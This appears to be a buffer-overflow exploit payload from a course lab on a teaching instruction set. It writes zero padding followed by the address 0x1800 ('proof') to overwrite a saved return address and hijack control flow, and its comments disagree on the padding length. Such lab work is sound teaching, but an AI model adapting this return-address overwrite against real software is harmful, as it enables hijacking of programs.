  ## need to insert 260 hexits of garbage value, followed by address of proof (0x1800) as new return value
  gpc $0, r6          # r6 = new return value

  .long 0x00000000     # 256 hexits of garbage
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000     
  .long 0x00000000      
  .long 0x00001800     # address of proof (want to set as new return value)     
